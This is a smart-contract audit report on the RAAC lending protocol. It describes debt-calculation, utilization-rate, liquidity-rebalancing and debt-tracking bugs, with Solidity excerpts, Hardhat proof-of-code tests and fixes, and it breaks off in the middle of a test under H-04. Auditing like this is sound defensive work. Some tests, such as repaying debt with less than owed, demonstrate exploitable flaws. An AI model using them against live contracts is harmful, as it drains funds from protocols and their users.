# Core Contracts - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Double Multiplication of Normalized Debt Results in Overestimation of User Debt During Liquidation](#H-01)
  - ### [H-02. Incorrect Utilization Rate Calculation in RAAC Minter leads to emission rate always increasing after first deposit](#H-02)
  - ### [H-03. LendingPool::\_\_rebalanceLiquidity() will always revert as Lending Pool contract doesnt hold assets which causes reverts on LendingPool::deposit meaning that users cannot deposit](#H-03)
  - ### [H-04. Inconsistent Debt Tracking Between LendingPool and DebtToken Leads to Incorrect Repayments and Underflows](#H-04)
  - ### [H-05. User can borrow more than their collateral leading to insolvent positions and undercollateralization](#H-05)
  - ### [H-06. User can withdraw their deposited NFT with borrowed debt > collateral leading to insolvent positions](#H-06)
  - ### [H-07. User can repay their debt after grace period ends and liquidation has been initiated which reduces liquidation risk for borrowers](#H-07)
  - ### [H-08. Transferring rToken devalues it via double scaling](#H-08)
  - ### [H-09. Sandwich Opportunity presented via stepwise reward distribution](#H-09)
  - ### [H-10. User is wrongfully liquidated when health factor is above threshold](#H-10)
  - ### [H-11. Fee Collector receives less fees when a user burns RAACToken](#H-11)
  - ### [H-12. Incorrect BoostCalculator::endTime expectations cause DOS which attackers can use to manipulate key votes](#H-12)
  - ### [H-13. User's cannot claim full rewards via flawed totalSupply implementation](#H-13)
  - ### [H-14. DOS in FeeCollector::claimRewards which prevents users from claiming rewards in subsequent periods](#H-14)
  - ### [H-15. Rate of decay not measured in veRAACToken::increase which allows users to unfairly boost voting power by calling this function](#H-15)
  - ### [H-16. MAX_TOTAL_SUPPLY enforcement can be bypassed allowing users to mint unlimited tokens](#H-16)
  - ### [H-17. Users with no voting power can vote on gauge emission weights](#H-17)
  - ### [H-18. Users can use the same voting power to assign weights to multiple gauges](#H-18)
  - ### [H-19. Malicious users can prematurely call GaugeController::distributeRewards immediately after voting and send all rewards to any gauge they want](#H-19)
  - ### [H-20. Incorrect reward calculation in BaseGauge::\_updateReward leads to reward dilution and/or a complete loss of rewards](#H-20)
- ## Medium Risk Findings
  - ### [M-01. Incorrect Price Precision Validation in RAACNFT::mint when retrieving price using chainlink functions can lead to allowing users mint NFT for a fraction of intended cost](#M-01)
  - ### [M-02. Users cannot be liquidated if reserveAsset does not match StabilityPool::crvUSD address](#M-02)
  - ### [M-03. Deposits/Withdrawals can be DOS'ed if crvVault::withdraw produces any losses](#M-03)
  - ### [M-04. Missing Liquidity Rebalancing in Repayments and Liquidations Leading to Inefficient Liquidity Management](#M-04)
  - ### [M-05. DOS can occur in LendingPool::rescueToken with ERC777 tokens and ERC721 tokens sent to contract addresses](#M-05)
  - ### [M-06. rToken Redemption Failure Due to Insufficient Liquidity for Accrued Interest](#M-06)
  - ### [M-07. Stale Liquidity Index causes Incorrect rToken balance reflection](#M-07)
  - ### [M-08. Rounding Error in rToken::calculateDustAmount allows draining of rToken assets over time](#M-08)
  - ### [M-09. DebtToken::totalSupply returns incorrect information](#M-09)
  - ### [M-10. Lack of incentives for users to call LendingPool::initiateLiquidation allows extensive delay between when health factor dropped below threshold and when grace period starts](#M-10)
  - ### [M-11. Incorrect boost initialization can lead to overflow](#M-11)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: Regnum Aurum Acquisition Corp

### Dates: Feb 3rd, 2025 - Feb 24th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-02-raac)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 20
- Medium: 11
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. Double Multiplication of Normalized Debt Results in Overestimation of User Debt During Liquidation

## Summary

StabilityPool::liquidateBorrower incorrectly calculates a user's total debt by multiplying the normalized debt by the usage index twice. This results in a significant overestimation of the amount required for liquidation, leading to unnecessary revert in StabilityPool::liquidateBorrower

## Vulnerability Details

In the liquidateBorrower function, the contract retrieves the user’s debt using:

'''solidity
uint256 userDebt = lendingPool.getUserDebt(userAddress);

````Solidity

This function already applies the usage index to the user’s scaled debt:

```solidity

function getUserDebt(address userAddress) public view returns (uint256) {
    UserData storage user = userData[userAddress];
    return user.scaledDebtBalance.rayMul(reserve.usageIndex);
}
````

However, in StabilityPool::liquidateBorrower, the contract incorrectly multiplies userDebt by the normalized debt (usage index) again:

```solidity

uint256 scaledUserDebt = WadRayMath.rayMul(
    userDebt,
    lendingPool.getNormalizedDebt()
);
```

## Proof Of Code (POC)

This test was run in protocols-test.js in the "StabilityPool" describe block

```javascript
it("userdebtisdoublecounted", async function () {
  //c for testing purposes
  // Setup stability pool deposit

  // Create position to be liquidated
  const newTokenId = HOUSE_TOKEN_ID + 2;
  await contracts.housePrices.setHousePrice(newTokenId, HOUSE_PRICE);
  await contracts.crvUSD
    .connect(user2)
    .approve(contracts.nft.target, HOUSE_PRICE);
  await contracts.nft.connect(user2).mint(newTokenId, HOUSE_PRICE);
  await contracts.nft
    .connect(user2)
    .approve(contracts.lendingPool.target, newTokenId);

  await contracts.lendingPool.connect(user2).depositNFT(newTokenId);
  await contracts.lendingPool.connect(user2).borrow(BORROW_AMOUNT);

  // Trigger and complete liquidation
  await contracts.housePrices.setHousePrice(
    newTokenId,
    (HOUSE_PRICE * 10n) / 100n
  );
  //c need to increase time to allow usage index to update
  await time.increase(73 * 60 * 60);
  await contracts.lendingPool.connect(user3).initiateLiquidation(user2.address);
  await time.increase(73 * 60 * 60);
  // Will call the lendingPool.finalizeLiquidation(user2.address)

  //c get the user debt before liquidation. need to update state to update the usage index
  contracts.lendingPool.updateState();
  const userdebt = await contracts.lendingPool.getUserDebt(user2.address);
  console.log(`userdebt: ${userdebt}`);

  const reservedata1 = await contracts.lendingPool.getAllUserData(
    user2.address
  );
  console.log(
    `reservedata1.scaledDebtBalance: ${reservedata1.scaledDebtBalance}`
  );
  //c IMPORTANT: to get this to display the correct userscaleddebtbalance, you need to go into lendingpool::getalluserdata and change the scaledDebtBalance return value to user.scaledDebtBalance instead of getUserDebt(userAddress)

  console.log(`usageindex: ${reservedata1.usageIndex}`);

  const expecteddebt = await contracts.reserveLibrary.raymul(
    reservedata1.scaledDebtBalance,
    reservedata1.usageIndex
  );
  console.log(`expecteddebt: ${expecteddebt}`);

  //c send sufficient amount of crvUSD to the stability pool to cover the expected debt
  await contracts.crvUSD
    .connect(user3)
    .approve(contracts.stabilityPool.target, STABILITY_DEPOSIT);
  await contracts.crvUSD
    .connect(user3)
    .transfer(contracts.stabilityPool.target, expecteddebt);

  /*c IMPORTANT: for this test to work, first go to reservelibrarymock.sol and include the following function:
      function raymul(
        uint256 val1,
        uint256 val2
    ) external pure returns (uint256) {
        return val1.rayMul(val2);
    }
       
       
       go into deploycontracts.js and add the following line:
       //c deploy reservelibrarymock
  const reserveLibrary = await deployContract("ReserveLibraryMock", []);
  and add  reserveLibrary to the return statement of deployContracts.js
       */

  //c proof that the userdebt is greater than their borrow amount which proves that the usage index has already been applied to it

  assert(userdebt > BORROW_AMOUNT);

  //c get normalized debt
  const normalizeddebt = await contracts.lendingPool.getNormalizedDebt();
  console.log(`normalizeddebt: ${normalizeddebt}`);

  await contracts.lendingPool.connect(owner).updateState();

  await expect(
    contracts.stabilityPool.connect(owner).liquidateBorrower(user2.address)
  ).to.be.revertedWithCustomError(
    contracts.stabilityPool,
    "InsufficientBalance"
  );
});
```

To see the inflated debt, go into StabilityPool.sol and add the scaledDebt variable to the InsufficientBalance custom error and when you run this test, you will see that the debt returned is more than the expected debt.

Incorrect debt calculation – The debt amount is multiplied by the usage index twice, leading to a higher-than-actual debt value.
Excessive repayment during liquidation – The contract will require more crvUSD than necessary to settle the user's debt.

## Impact

Stability pool will pay more than required to settle a borrower's debt. The lending protocol’s fund allocations will become inaccurate, leading to mismanagement of reserves as it will always have to repay more than the user's actual debt. In extreme cases, systemic risks could arise due to miscalculated liquidations affecting protocol stability.

## Tools Used

Manual Review, Hardhat

## Recommendations

Remove the extra multiplication by the usage index in liquidateBorrower. Instead of:

```solidity
uint256 scaledUserDebt = WadRayMath.rayMul(
    userDebt,
    lendingPool.getNormalizedDebt()
);
```

Use:

```solidity
uint256 scaledUserDebt = userDebt;
```

Since LendingPool::getUserDebt() already applies the usage index, this change ensures the debt amount is accurately calculated.

## <a id='H-02'></a>H-02. Incorrect Utilization Rate Calculation in RAAC Minter leads to emission rate always increasing after first deposit

## Summary

The RAAC Minter contract incorrectly calculates the utilization rate, leading to unintended emission rate adjustments. The function getUtilizationRate() retrieves the total borrowed value from lendingPool.getNormalizedDebt(), which returns the usage index instead of the total normalized debt supply. This results in an incorrect utilization rate calculation, causing emission rates to always increase after the first deposit in StabilityPool::deposit.

## Vulnerability Details

Vulnerability Details
The vulnerability exists in the following function inside the RAAC Minter contract:

```solidity
/**
 * @dev Calculates the current system utilization rate
 * @return The utilization rate as a percentage (0-100)
 */
function getUtilizationRate() public view returns (uint256) {
    uint256 totalBorrowed = lendingPool.getNormalizedDebt();


    uint256 totalDeposits = stabilityPool.getTotalDeposits();
    if (totalDeposits == 0) return 0;
    return (totalBorrowed * 100) / totalDeposits;
}
```

The function lendingPool.getNormalizedDebt() does not return the total normalized debt but rather the usageIndex, which is not useful for utilization calculations.The correct value for totalBorrowed should be the total normalized supply of the debt token, which represents the actual outstanding debt in the system.Since the incorrect totalBorrowed value is used, the utilization rate calculation is fundamentally flawed. As a result, getUtilizationRate() returns a nonzero utilization rate even when there is no actual borrowed amount. Since the usageIndex is in ray precision (1e27) and total deposits have 18 decimal precision, the calculation will be flawed. As a result, the emission rate will only ever decrease once which will be the first time a user deposits using StabilityPool::deposit. Every deposit/borrow after that will produce an increase in the emission rate which is not intended behaviour.

## Proof Of Code (POC)

This test was run in protocols-test.js in the "StabilityPool" describe block

```javascript
it("test minter utilization rate never less than utilization target after first deposit", async function () {
  const preupdateemissionrate = await contracts.minter.getEmissionRate();
  console.log(`preupdateemissionrate: ${preupdateemissionrate}`);
  console.log(`benchmark: ${await contracts.minter.benchmarkRate()}`);

  const utilratepredeposit = await contracts.minter.getUtilizationRate();
  console.log(`utilratepredeposit: ${utilratepredeposit}`);
  //c start from a position where there is no debt in the protocol but there are rtoken deposits in the stability pool. In this position, the utilization rate should be 0 but it wont be due to wrong calculation in the minter contract

  //c deposit function calls raacminter::tick which updatesemissionrate when utilization rate is 0 so the emission rate will decrease on the first mint as expected
  await contracts.stabilityPool.connect(user1).deposit(STABILITY_DEPOSIT);

  //c to run this test, temporarily, change the getUtilizationRate() function in the minter contract to public. This will show the incorrect utilization rate. since there is no debt accrued in the lending pool, the utilization rate should be 0 but it isnt because the minter contract calculates the utilization rate incorrectly
  const mintutilrate = await contracts.minter.getUtilizationRate();
  console.log(`mintutilrate: ${mintutilrate}`);
  assert(mintutilrate > 0);
  const emissionrateafterdeposit = await contracts.minter.getEmissionRate();
  console.log(`emissionrateafterdeposit: ${emissionrateafterdeposit}`);

  //allow some time to pass with no more deposits or borrows. then updateemissionsrate and see that the rate has increased to match the benchmark rate when it should decrease
  await time.increase(73 * 60 * 60);
  await contracts.minter.updateEmissionRate();
  const postupdateemissionrate = await contracts.minter.getEmissionRate();
  console.log(`postupdateemissionrate: ${postupdateemissionrate}`);
  assert(postupdateemissionrate > emissionrateafterdeposit);
});
```

## Impact

Inaccurate Emission Adjustments: Since the emission rate is dynamically adjusted based on utilization, an incorrect calculation means the protocol could emit too many or too few rewards, affecting the incentive structure.
Protocol Inefficiency: A nonzero utilization rate when no debt exists means emissions could be kept higher than necessary, leading to excessive inflation of RAAC rewards.
Misleading Data: Users relying on the utilization rate for decision-making (e.g., whether to deposit or borrow) could be misled into making incorrect financial decisions.

## Tools Used

Manual Review, Hardhat

## Recommendations

To fix this issue, totalBorrowed should be set to the actual total supply of the debt token rather than relying on lendingPool.getNormalizedDebt(). Modify getUtilizationRate() as follows:

```solidity
/**
 * @dev Calculates the current system utilization rate
 * @return The utilization rate as a percentage (0-100)
 */
function getUtilizationRate() public view returns (uint256) {
    uint256 totalBorrowed = IDebtToken(debtTokenAddress).totalSupply();
    // Fix: Get total normalized supply of the debt token instead of using getNormalizedDebt()

    uint256 totalDeposits = stabilityPool.getTotalDeposits();
    if (totalDeposits == 0) return 0;
    return (totalBorrowed * 100) / totalDeposits;
}
```

This ensures:

The correct total borrowed value is used.
The utilization rate reflects actual lending activity.
Emissions are adjusted appropriately based on real system usage.
By implementing this fix, the protocol will correctly adjust emission rates based on actual utilization, preventing unintended reward distortions and ensuring better efficiency.

## <a id='H-03'></a>H-03. LendingPool::\_\_rebalanceLiquidity() will always revert as Lending Pool contract doesnt hold assets which causes reverts on LendingPool::deposit meaning that users cannot deposit

## Summary

The Lending Pool contract attempts to deposit excess liquidity into the Curve Vault via \_rebalanceLiquidity(). However, due to the way liquidity is handled in the system, there are no assets in the Lending Pool contract itself, causing the deposit into the Curve Vault to fail. This results in deposit transactions reverting, preventing users from adding liquidity to the Lending Pool.

## Vulnerability Details

Whenever funds are dealt with (for the most part) in the Lending Pool contract, LendingPool::\_\_rebalanceLiquidity() is called to make sure that the Rtoken has enough available liquidity to manage its normal activities. See function below:

```solidity
 /**
     * @notice Rebalances liquidity between the buffer and the Curve vault to maintain the desired buffer ratio
     */
    function _rebalanceLiquidity() internal {
        // if curve vault is not set, do nothing
        if (address(curveVault) == address(0)) {
            return;
        }

        uint256 totalDeposits = reserve.totalLiquidity; // Total liquidity in the system
        uint256 desiredBuffer = totalDeposits.percentMul(liquidityBufferRatio);
        uint256 currentBuffer = IERC20(reserve.reserveAssetAddress).balanceOf(reserve.reserveRTokenAddress);

        if (currentBuffer > desiredBuffer) {
            uint256 excess = currentBuffer - desiredBuffer;
            // Deposit excess into the Curve vault
            _depositIntoVault(excess);
        } else if (currentBuffer < desiredBuffer) {
            uint256 shortage = desiredBuffer - currentBuffer;
            // Withdraw shortage from the Curve vault
            _withdrawFromVault(shortage);
        }

        emit LiquidityRebalanced(currentBuffer, totalVaultDeposits);
    }
```

The idea is that if the Rtoken has more assets than the buffer, then the excess tokens should be deposited in the crvUsd vault to gain rewards and if there is a shortage of tokens, then tokens should be withdrawn from the vault. See LendingPool::\_depositIntoVault:

```solidity
 /**
     * @notice Internal function to deposit liquidity into the Curve vault
     * @param amount The amount to deposit
     */
    function _depositIntoVault(uint256 amount) internal {
        IERC20(reserve.reserveAssetAddress).approve(address(curveVault), amount);
        curveVault.deposit(amount, address(this));
        totalVaultDeposits += amount;
    }
```

The issue is that this function attempts to deposit tokens into the curve vault using funds inside the LendingPool contract. Whenever assets are sent to the LendingPool. For example, via LendingPool::deposit. See below:

```solidity
 /**
     * @notice Allows a user to deposit reserve assets and receive RTokens
     * @param amount The amount of reserve assets to deposit
     */
    function deposit(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        // Update the reserve state before the deposit
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Perform the deposit through ReserveLibrary
        uint256 mintedAmount = ReserveLibrary.deposit(reserve, rateData, amount, msg.sender);

        // Rebalance liquidity after deposit
        _rebalanceLiquidity();

        emit Deposit(msg.sender, amount, mintedAmount);
    }

```

This makes a call to ReserveLibrary::deposit :

```solidity
/**
     * @notice Handles deposit operation into the reserve.
     * @dev Transfers the underlying asset from the depositor to the reserve, and mints RTokens to the depositor.
     *      This function assumes interactions with ERC20 before updating the reserve state (you send before we update how much you sent).
     *      A untrusted ERC20's modified mint function calling back into this library will cause incorrect reserve state updates.
     *      Implementing contracts need to ensure reentrancy guards are in place when interacting with this library.
     * @param reserve The reserve data.
     * @param rateData The reserve rate parameters.
     * @param amount The amount to deposit.
     * @param depositor The address of the depositor.
     * @return amountMinted The amount of RTokens minted.
     */
    function deposit(
        ReserveData storage reserve,
        ReserveRateData storage rateData,
        uint256 amount,
        address depositor
    ) internal returns (uint256 amountMinted) {
        if (amount < 1) revert InvalidAmount();

        // Update reserve interests
        updateReserveInterests(reserve, rateData);

        // Transfer asset from caller to the RToken contract
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(
            msg.sender, // from
            reserve.reserveRTokenAddress, // to
            amount // amount
        );

        // Mint RToken to the depositor (scaling handled inside RToken)
        (
            bool isFirstMint,
            uint256 amountScaled,
            uint256 newTotalSupply,
            uint256 amountUnderlying
        ) = IRToken(reserve.reserveRTokenAddress).mint(
                address(this), // caller
                depositor, // onBehalfOf
                amount, // amount
                reserve.liquidityIndex // index
            );

        amountMinted = amountScaled;

        // Update the total liquidity and interest rates
        updateInterestRatesAndLiquidity(reserve, rateData, amount, 0);

        emit Deposit(depositor, amount, amountMinted);

        return amountMinted;
    }

```

As you can see, this deposit transfers the tokens to the Rtoken contract. As a result, no assets are in the Lending Pool contract. So any attempts to deposit into the crvvault will revert as the Lending Pool will not have the balance to deposit into the curve vault. As a result, whenever a user attempts to deposit tokens into the Lending Pool, it will revert which means no user can deposit tokens into the Lending Pool contract.

## Proof Of Code (POC)

To run this test , I created a mock crvVault contract with the following code which takes some functionality from how curve implements its vaults which is standard ERC4626 with some extra safeguards. You can see the curve vault contracts at `https://github.com/curvefi/scrvusd/blob/main/contracts/yearn/VaultV3.vy` . See contract below:

```solidity
//SDPX-license-Identifier: MIT

pragma solidity ^0.8.20;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockCrvVault is ERC20, ERC4626 {
    address public crv;
    error CannotDepositZeroShares();

    constructor(address _crv) ERC20("Vault", "VLT") ERC4626(IERC20(_crv)) {
        crv = _crv; // Initialize the crv variable
    }

    function decimals() public pure override(ERC20, ERC4626) returns (uint8) {
        return 18;
    }

    function deposit(
        uint256 assets,
        address receiver
    ) public override returns (uint256) {
        uint256 previewedShares = convertToShares(assets);
        if (previewedShares == 0) {
            revert CannotDepositZeroShares();
        }
        super.deposit(assets, receiver);
    }
}
```

This test was run in LendingPool.test.js in the "Borrow and Repay" describe block
See comments I left in the test below for instructions on how to run the test with MockCrvVault contract. See test below:

```javascript
it("deposits in curve vault will revert with insufficient balance", async function () {
  //c for testing purposes
  /*c to run this test, deploy the mockcrvvault contract and set it as the curve vault in the lending pool. to do this, add the following line to the test script:

      const MockCrvVault = await ethers.getContractFactory("MockCrvVault");
    mockcrvvault = await MockCrvVault.deploy(crvusd.target);

    You also need to deploy the mockcrvvault I created which i have shared in the submission

      */
  await lendingPool.setCurveVault(mockcrvvault.target);

  const depositAmount = ethers.parseEther("1000");
  await crvusd.connect(user2).approve(lendingPool.target, depositAmount);

  await expect(
    lendingPool.connect(user2).deposit(depositAmount)
  ).to.be.revertedWithCustomError("ERC20InsufficientBalance");
});
```

## Impact

Complete Deposit Failure: Users cannot deposit funds into the Lending Pool, as the deposit transaction will always revert.
Protocol Deadlock: Since \_rebalanceLiquidity() is called in various functions, other interactions with the Lending Pool may also fail.
No Yield Optimization: The intended functionality of depositing excess liquidity into Curve Vaults for yield farming is completely broken.

## Tools Used

Manual Review, Hardhat

## Recommendations

Instead of attempting to deposit tokens into the Curve Vault from the Lending Pool contract, add a function in the RToken contract that allows it to deposit into the Curve Vault directly. Then, modify \_depositIntoVault() in the Lending Pool contract to call this function.

Modify RToken contract: Add a function to deposit directly into the Curve Vault.

```solidity
function depositIntoCurveVault(uint256 amount, address vault) external onlyLendingPool {
    IERC20(reserveAssetAddress).approve(vault, amount);
    ICurveVault(vault).deposit(amount, address(this));
}
```

Modify Lending Pool: Update \_depositIntoVault() to use the RToken function.

```solidity

function _depositIntoVault(uint256 amount) internal {
    IRToken(reserve.reserveRTokenAddress).depositIntoCurveVault(amount, address(curveVault));
    totalVaultDeposits += amount;
}
```

This ensures that tokens are deposited from the RToken contract, which actually holds the assets. Prevents reverting transactions due to insufficient balance and maintains the intended liquidity optimization functionality.
This fix ensures that deposits into the Lending Pool proceed smoothly without unnecessary reverts, allowing liquidity rebalancing to function as expected.

## <a id='H-04'></a>H-04. Inconsistent Debt Tracking Between LendingPool and DebtToken Leads to Incorrect Repayments and Underflows

## Summary

A discrepancy exists between how LendingPool and DebtToken track user debt. When a user borrows assets, LendingPool updates its internal scaledDebtBalance, while DebtToken mints debt tokens with an additional balance increase (accrued interest since the last borrow). This creates an inconsistency where the DebtToken balance exceeds the user's scaledDebtBalance in LendingPool.

This inconsistency introduces two critical issues:

- Users can clear their debt with less than the actual debt amount, leading to a potential loss of revenue for the protocol.
- Repayment underflows occur when a user attempts to repay based on their debt token balance, leading to a Denial-of-Service (DOS) where repayment is permanently broken.

## Vulnerability Details

When a user has deposited a RAACNft into the protocol, they are allowed to borrow assets from the rToken via LendingPool::borrow. See below:

```solidity
/**
     * @notice Allows a user to borrow reserve assets using their NFT collateral
     * @param amount The amount of reserve assets to borrow
     */
    function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

        UserData storage user = userData[msg.sender];

        uint256 collateralValue = getUserCollateralValue(msg.sender);

        if (collateralValue == 0) revert NoCollateral();

        // Update reserve state before borrowing
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Fetch user's total debt after borrowing
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

        // Ensure the user has enough collateral to cover the new debt
        if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }

        // Update user's scaled debt balance
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);


        // Mint DebtTokens to the user (scaled amount)
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);

        // Transfer borrowed amount to user
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        user.scaledDebtBalance += scaledAmount;
        // reserve.totalUsage += amount;
        reserve.totalUsage = newTotalSupply;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);

        // Rebalance liquidity after borrowing
        _rebalanceLiquidity();

        emit Borrow(msg.sender, amount);
    }

```

Notice how the normalized debt amount (scaledAmount) is always added to the user's total scaled debt balance. user.scaledDebtBalance is the main metric used to determine whether a user is in debt or not. This value should ideally match the scaled debt balance of the user in the debt token contract for proper accounting in the system.
As a user borrows tokens from the rToken contract, they are simultaneously minted non transferable Debt tokens via DebtToken::mint. See below:

```solidity
 /**
     * @notice Mints debt tokens to a user
     * @param user The address initiating the mint
     * @param onBehalfOf The recipient of the debt tokens
     * @param amount The amount to mint (in underlying asset units)
     * @param index The usage index at the time of minting
     * @return A tuple containing:
     *         - bool: True if the previous balance was zero
     *         - uint256: The amount of scaled tokens minted
     *         - uint256: The new total supply after minting
     */
    function mint(
        address user,
        address onBehalfOf,
        uint256 amount,
        uint256 index
    ) external override onlyReservePool returns (bool, uint256, uint256) {
        if (user == address(0) || onBehalfOf == address(0))
            revert InvalidAddress();
        if (amount == 0) {
            return (false, 0, totalSupply());
        }

        uint256 amountScaled = amount.rayDiv(index);
        if (amountScaled == 0) revert InvalidAmount();

        uint256 scaledBalance = balanceOf(onBehalfOf);
        bool isFirstMint = scaledBalance == 0;

        uint256 balanceIncrease = 0;
        if (
            _userState[onBehalfOf].index != 0 &&
            _userState[onBehalfOf].index < index
        ) {
            balanceIncrease =
                scaledBalance.rayMul(index) -
                scaledBalance.rayMul(_userState[onBehalfOf].index);
        }

        _userState[onBehalfOf].index = index.toUint128();

        uint256 amountToMint = amount + balanceIncrease;
        _mint(onBehalfOf, amountToMint.toUint128());

        emit Transfer(address(0), onBehalfOf, amountToMint);
        emit Mint(user, onBehalfOf, amountToMint, balanceIncrease, index);

        return (scaledBalance == 0, amountToMint, totalSupply());
    }

```

The discrepancy lies in the way the mint function works. Specifically:

```solidity

 if (
            _userState[onBehalfOf].index != 0 &&
            _userState[onBehalfOf].index < index
        ) {
            balanceIncrease =
                scaledBalance.rayMul(index) -
                scaledBalance.rayMul(_userState[onBehalfOf].index);
        }

        _userState[onBehalfOf].index = index.toUint128();

        uint256 amountToMint = amount + balanceIncrease;
```

DebtToken::balanceIncrease which is amount of interest the user has accumulated since their last borrow is added to their current amount and DebtToken::amountToMint is then normalized and minted to the user which is a different value to user.scaledDebtBalance recorded in LendingPool::borrow. As a result, the user's debt token balance will always be larger than user.scaledDebtBalance which leads to 2 major issues. The first is that assuming that the user's debt token balance is used to represent the user's debt in the system, it means that the user can repay their debt will a lower amount that their actual debt. It also means that if a user tries to clear their debt by attempting to pay off their debt token balance, it will cause an underflow leading to a DOS. See LendingPool::\_repay:

```solidity
function _repay(uint256 amount, address onBehalfOf) internal {
        if (amount == 0) revert InvalidAmount();
        if (onBehalfOf == address(0)) revert AddressCannotBeZero();

        UserData storage user = userData[onBehalfOf];

        // Update reserve state before repayment
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Calculate the user's debt (for the onBehalfOf address)
        uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
        uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

        // If amount is greater than userDebt, cap it at userDebt
        uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;

        uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

        // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
        // is not actualRepayAmount because we want to allow paying extra dust and we will then cap there
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
            IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);

        // Transfer reserve assets from the caller (msg.sender) to the reserve
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);

        reserve.totalUsage = newTotalSupply;
        user.scaledDebtBalance -= amountBurned;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);

        emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
    }

```

## Proof Of Code (POC)

These tests were run in LendingPool.test.js in the "Borrow and Repay" describe block
There are 2 tests run. The first shows that the user can clear the debt with less tokens than their debt balance and the second shows the underflow

```javascript
it("users can clear debt without full repayment", async function () {
  //c for testing purposes

  const borrowAmount = ethers.parseEther("50");

  //c on first borrow for user, the amount of debt tokens is correct as the balanceIncrease remains 0 as the if condition is not run
  await lendingPool.connect(user1).borrow(borrowAmount);

  const reservedata = await lendingPool.getAllUserData(user1.address);
  console.log(`usageindex`, reservedata.usageIndex);

  const expecteddebt = await reserveLibrary.raymul(
    reservedata.scaledDebtBalance,
    reservedata.usageIndex
  );

  console.log(`expecteddebt`, expecteddebt);

  //c note that the balanceOf function gets the actual debt by multiplying the normalized debt by the usage index. See DebtToken::balanceOf
  const debtBalance = await debtToken.balanceOf(user1.address);
  console.log("debtBalance", debtBalance);

  //c proof that the expectedamount is debt is the same as the debt balance after first deposit
  assert(expecteddebt == debtBalance);

  //c allow time to pass so that the usage index is updated
  await time.increase(365 * 24 * 60 * 60);

  //c on second borrow for user, the amount of debt tokens differs from the users scaleddebtbalance in the LendingPool contract as the balanceIncrease is not 0 as the if condition is run
  await lendingPool.connect(user1).borrow(borrowAmount);

  const reservedata1 = await lendingPool.getAllUserData(user1.address);
  console.log(`secondborrowusageindex`, reservedata1.usageIndex);

  const secondborrowexpecteddebt = await reserveLibrary.raymul(
    reservedata1.scaledDebtBalance,
    reservedata1.usageIndex
  );

  console.log(reservedata1.scaledDebtBalance);

  console.log(`secondborrowexpecteddebt`, secondborrowexpecteddebt);
  const secondborrowdebtBalance = await debtToken.balanceOf(user1.address);

  //c proof that the expecteddebt is now less than the debt balance after second borrow which shows inconsistency
  assert(secondborrowdebtBalance > secondborrowexpecteddebt);

  //c user will be able to repay their full debt but they will still have debt tokens leftover which shows the inconsistency between scaled debt in the lending pool and the debt token which means that a user can create a scenario where the LendingPool thinks that user has cleared their debt when in reality, they still have debt according to the debt token contract
  await lendingPool.connect(user1).repay(secondborrowexpecteddebt);
  const reservedata2 = await lendingPool.getAllUserData(user1.address);
  console.log(`userscaleddebt`, reservedata2.scaledDebtBalance);

  const postrepayexpecteddebt = await reserveLibrary.raymul(
    reservedata2.scaledDebtBalance,
    reservedata2.usageIndex
  );

  const postrepaydebtBalance = await debtToken.balanceOf(user1.address);
  console.log("postrepaydebtBalance", postrepaydebtBalance);

  assert(postrepaydebtBalance > postrepayexpecteddebt);
  assert(postrepayexpecteddebt == 0);
});

it("underflow occurs in repay", async function () {
  //c for testing purposes

  const borrowAmount = ethers.parseEther("50");

  //c on first borrow for user, the amount of debt tokens is correct as the balanceIncrease remains 0 as the if condition is not run
  await lendingPool.connect(user1).borrow(borrowAmount);

  const reservedata = await lendingPool.getAllUserData(user1.address);
  console.log(`usageindex`, reservedata.usageIndex);

  const expecteddebt = await reserveLibrary.raymul(
    reservedata.scaledDebtBalance,
    reservedata.usageIndex
  );

  console.log(`expecteddebt`, expecteddebt);
  //c note that the balanceOf function gets the actual debt by multiplying the normalized debt by the usage index. See DebtToken::balanceOf
  const debtBalance = await debtToken.balanceOf(user1.address);
  console.log("debtBalance", debtBalance);

  //c proof that the expectedamount is debt is the same as the debt balance after first deposit
  assert(expecteddebt == debtBalance);

  //c allow time to pass so that the usage index is updated
  await time.increase(365 * 24 * 60 * 60);

  //c on second borrow for user, the amount of debt tokens is inflated as the balanceIncrease is not 0 as the if condition is run
  await lendingPool.connect(user1).borrow(borrowAmount);

